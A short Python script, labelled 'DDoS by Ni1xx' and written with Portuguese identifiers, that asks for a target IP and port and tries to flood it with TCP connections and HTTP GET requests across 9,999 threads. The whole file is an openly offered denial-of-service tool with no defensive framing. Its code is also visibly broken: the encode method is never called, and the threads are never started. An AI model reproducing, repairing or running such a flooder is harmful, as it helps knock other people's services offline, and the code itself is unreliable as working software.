import socket
import random
import time
import threading

print ("DDoS by Ni1xx")

def ataque(ip_alvo, porta_alvo):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip_alvo, porta_alvo))
            s.send("GET / HTTP/1.1\r\n" .encode)
            s.close()
        except Exception as e:
            print("Erro", e)

ip_alvo = input("Digite o IP do alvo: ")
porta_alvo = int(input("Digite a porta do alvo: "))

num_threads = 9999

for _ in range(num_threads):
    t = threading.Thread(target=ataque, args=(ip_alvo, porta_alvo))

while True:
    time.sleep(0)